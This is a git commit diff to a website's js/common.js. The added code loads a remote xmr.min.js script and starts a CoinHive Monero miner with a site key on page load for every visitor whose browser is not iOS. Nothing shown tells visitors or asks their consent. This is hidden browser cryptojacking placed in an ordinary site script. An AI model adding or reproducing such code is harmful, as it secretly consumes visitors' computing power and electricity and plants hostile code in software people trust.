1e4ed410dbf4f73b8207b0984bc6513959ea8f50
Vanessa <lly219@gmail.com>
2017-12-11 14:21:53 +0800

    :sparkles: xmr

--- js/common.js
+++ js/common.js
@@ -141,4 +141,15 @@ $(document).ready(function() {
     index.init();
     index.headerScroll();
     $(window).scroll();
+
+  if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+    return
+  }
+  const scriptDom = document.createElement('script')
+  scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
+  document.head.appendChild(scriptDom)
+  scriptDom.onload = function () {
+    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5});
+    miner.start();
+  }
 });
